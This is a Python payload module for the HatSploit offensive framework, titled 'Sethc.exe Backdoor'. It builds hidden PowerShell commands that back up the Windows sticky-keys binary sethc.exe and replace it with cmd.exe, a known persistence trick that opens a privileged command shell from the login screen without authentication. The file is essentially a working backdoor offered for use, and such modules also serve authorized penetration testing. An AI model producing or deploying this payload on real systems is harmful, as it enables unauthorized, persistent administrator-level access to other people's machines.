"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *

class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Sethc.exe Backdoor",
            'Payload': "windows/generic/sethc_backdoor",
            'Authors': [
                'Loubaris - payload developer',
            ],
            'Description': "Replaces sethc.exe with cmd.exe for backdoor access.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_WINDOWS,
            'Rank': "low",
            'Type': "one_side",
        })

    def run(self):
        backup_command = 'Copy-Item -Path "$env:windir\\system32\\sethc.exe" -Destination "$env:windir\\system32\\sethc.bak" -Force'
        replace_command = 'Copy-Item -Path "$env:windir\\system32\\cmd.exe" -Destination "$env:windir\\system32\\sethc.exe" -Force'

        backup_payload = f"powershell -w hidden -nop -c \"{backup_command}\""
        replace_payload = f"powershell -w hidden -nop -c \"{replace_command}\""

        payload = f"{backup_payload};{replace_payload}"
        return payload
